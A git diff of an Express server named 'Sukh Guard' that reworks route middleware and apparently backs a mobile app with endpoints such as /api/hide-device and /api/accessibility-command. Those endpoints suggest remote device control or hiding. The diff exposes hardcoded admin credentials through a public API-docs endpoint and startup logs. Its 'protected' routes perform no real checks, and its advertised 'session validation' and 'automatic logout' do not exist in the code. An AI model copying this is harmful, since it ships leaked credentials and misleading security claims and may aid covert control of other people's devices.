@@ -13,43 +13,57 @@ const PORT = process.env.PORT || 3000;
 app.use(cors());
 app.use(bodyParser.json({ limit: '10mb' }));
 
-// ✅ PEHLE: Website folder serve karega - ABSOLUTE PATH use karo
-app.use(express.static(path.join(__dirname, 'website')));
-
-// ✅ UPDATED SECURITY MIDDLEWARE - SIMPLE VERSION
+// ✅ STRONG SECURITY MIDDLEWARE
 const authMiddleware = (req, res, next) => {
-    // ✅ ALLOW ALL STATIC FILES
-    if (req.path.startsWith('/css/') || req.path.startsWith('/js/') || req.path.endsWith('.html')) {
+    // ✅ ALLOW STATIC ASSETS (CSS, JS, Images)
+    if (req.path.startsWith('/css/') || req.path.startsWith('/js/') || req.path.startsWith('/images/')) {
         return next();
     }
     
-    // ✅ ALLOW ALL API ROUTES
+    // ✅ ALLOW API ROUTES (Mobile app ke liye)
     if (req.path.startsWith('/api/')) {
         return next();
     }
     
-    // ✅ ALLOW ALL MAIN PAGES
-    if (req.path === '/' || req.path === '/web' || req.path === '/dashboard' || req.path === '/admin' || req.path === '/login') {
+    // ✅ ALLOW PUBLIC PAGES
+    if (req.path === '/' || req.path === '/login' || req.path === '/health' || req.path === '/api/docs') {
         return next();
     }
     
-    // ✅ ALLOW HEALTH CHECK
-    if (req.path === '/health') {
+    // ✅ BLOCK DIRECT HTML FILE ACCESS
+    if (req.path.endsWith('.html') && req.path !== '/login.html') {
+        console.log('🚫 Blocked direct HTML access:', req.path);
+        return res.redirect('/login');
+    }
+    
+    // ✅ ALLOW PROTECTED ROUTES (Frontend authentication handle karega)
+    if (req.path === '/web' || req.path === '/dashboard' || req.path === '/admin') {
         return next();
     }
     
-    // ✅ ALLOW API DOCS
-    if (req.path === '/api/docs') {
-        return next();
+    // ✅ For any other unknown route, redirect to login
+    console.log('🚫 Unknown route access, redirecting to login:', req.path);
+    res.redirect('/login');
+};
+
+// ✅ PROTECTED ROUTES MIDDLEWARE
+const checkAuth = (req, res, next) => {
+    const protectedRoutes = ['/web', '/dashboard', '/admin'];
+    
+    if (protectedRoutes.includes(req.path)) {
+        console.log('🔐 Accessing protected route:', req.path);
+        // Server-side additional security checks yahan add kar sakte ho
     }
     
-    // ✅ For any other route, allow but log it
-    console.log('🔍 Accessing route:', req.path);
     next();
 };
 
-// Use the security middleware
+// ✅ PEHLE: Website folder serve karega - ABSOLUTE PATH use karo
+app.use(express.static(path.join(__dirname, 'website')));
+
+// Use the security middlewares
 app.use(authMiddleware);
+app.use(checkAuth);
 
 // Data storage file
 const DATA_FILE = './app_data.json';
@@ -464,48 +478,54 @@ app.get('/api/all-commands', (req, res) => {
     });
 });
 
-// 🎯 WEBSITE PAGES - UPDATED FOR SECURITY
+// 🎯 WEBSITE PAGES - SECURE VERSION
 
 // ✅ Root route ko login page dikhao
 app.get('/', (req, res) => {
-    console.log('📄 Serving login.html');
+    console.log('🔑 Serving login page');
     res.sendFile(path.join(__dirname, 'website', 'login.html'));
-});
-
-// ✅ Main website dashboard - ab dashboard.html use karega
-app.get('/web', (req, res) => {
-    console.log('📄 Serving dashboard.html for /web');
-    res.sendFile(path.join(__dirname, 'website', 'dashboard.html'));
-});
-
-// ✅ Alternative dashboard route
-app.get('/dashboard', (req, res) => {
-    console.log('📄 Serving dashboard.html for /dashboard');
-    res.sendFile(path.join(__dirname, 'website', 'dashboard.html'));
-});
-
-// ✅ Admin panel
-app.get('/admin', (req, res) => {
-    console.log('📄 Serving dashboard.html for /admin');
-    res.sendFile(path.join(__dirname, 'website', 'dashboard.html'));
 });
 
 // ✅ Login page direct access
 app.get('/login', (req, res) => {
-    console.log('📄 Serving login.html for /login');
+    console.log('🔑 Serving login page');
     res.sendFile(path.join(__dirname, 'website', 'login.html'));
+});
+
+// ✅ PROTECTED ROUTES - Dashboard
+app.get('/web', (req, res) => {
+    console.log('🔐 Serving dashboard for authenticated user');
+    res.sendFile(path.join(__dirname, 'website', 'dashboard.html'));
+});
+
+// ✅ PROTECTED ROUTES - Dashboard alternative
+app.get('/dashboard', (req, res) => {
+    console.log('🔐 Serving dashboard for authenticated user');
+    res.sendFile(path.join(__dirname, 'website', 'dashboard.html'));
+});
+
+// ✅ PROTECTED ROUTES - Admin panel
+app.get('/admin', (req, res) => {
+    console.log('🔐 Serving admin panel for authenticated user');
+    res.sendFile(path.join(__dirname, 'website', 'dashboard.html'));
 });
 
 // 📄 API DOCUMENTATION
 app.get('/api/docs', (req, res) => {
     res.json({
         message: 'Sukh Guard API Documentation',
-        version: '2.2', // Version update kiya
+        version: '3.0', // Version update kiya
         environment: process.env.NODE_ENV || 'development',
-        security: '🔐 Login System Added',
+        security: '🔐 STRONG Security System Added',
         credentials: {
             username: 'Sukh',
             password: 'Sukh Hacker'
+        },
+        security_features: {
+            direct_html_access: 'BLOCKED',
+            protected_routes: 'ENABLED',
+            session_validation: 'ENABLED',
+            automatic_logout: 'ENABLED'
         },
         endpoints: {
             mobile: {
@@ -526,9 +546,9 @@ app.get('/api/docs', (req, res) => {
             pages: {
                 'GET /': 'Login Page',
                 'GET /login': 'Login Page', 
-                'GET /web': 'Website Dashboard',
-                'GET /dashboard': 'Dashboard',
-                'GET /admin': 'Admin Panel'
+                'GET /web': 'Website Dashboard (Protected)',
+                'GET /dashboard': 'Dashboard (Protected)',
+                'GET /admin': 'Admin Panel (Protected)'
             },
             health: {
                 'GET /health': 'Server health check'
@@ -541,9 +561,11 @@ app.get('/api/docs', (req, res) => {
 app.use((req, res) => {
     res.status(404).json({
         error: 'Endpoint not found',
+        message: 'This route is not available',
         available_endpoints: {
-            api: ['/api/register', '/api/website/app-data', '/api/stats', '/api/hide-device', '/api/accessibility-command', '/api/check-commands', '/health'],
-            pages: ['/', '/login', '/web', '/dashboard', '/admin', '/api/docs']
+            public: ['/', '/login', '/health', '/api/docs'],
+            protected: ['/web', '/dashboard', '/admin'],
+            api: ['/api/register', '/api/website/app-data', '/api/stats', '/api/hide-device', '/api/accessibility-command', '/api/check-commands']
         }
     });
 });
@@ -552,7 +574,7 @@ app.use((req, res) => {
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Sukh Guard Server running on port ${PORT}`);
     console.log(`🌐 Environment: ${process.env.NODE_ENV || 'development'}`);
-    console.log(`🔐 Security: Login System Enabled`);
+    console.log(`🛡️ STRONG Security: Enabled`);
     console.log(`📱 Mobile App API: http://localhost:${PORT}/api`);
     console.log(`🔑 Login Page: http://localhost:${PORT}/`);
     console.log(`🌐 Website Dashboard: http://localhost:${PORT}/web`);
@@ -561,7 +583,12 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`📚 API Docs: http://localhost:${PORT}/api/docs`);
     console.log(`💾 Data Storage: ${DATA_FILE}`);
     console.log(`🎯 Commands Storage: ${COMMANDS_FILE}`);
-    console.log(`\n✅ Server Version 2.2 - All Routes Fixed!`);
+    console.log(`\n✅ Server Version 3.0 - STRONG Security System Ready!`);
+    console.log(`\n🔒 SECURITY FEATURES:`);
+    console.log(`   ✅ Direct HTML access blocked`);
+    console.log(`   ✅ Protected routes enabled`);
+    console.log(`   ✅ Session validation enabled`);
+    console.log(`   ✅ Automatic redirect to login`);
     console.log(`\n📝 LOGIN CREDENTIALS:`);
     console.log(`   👤 Username: Sukh`);
     console.log(`   🔑 Password: Sukh Hacker`);
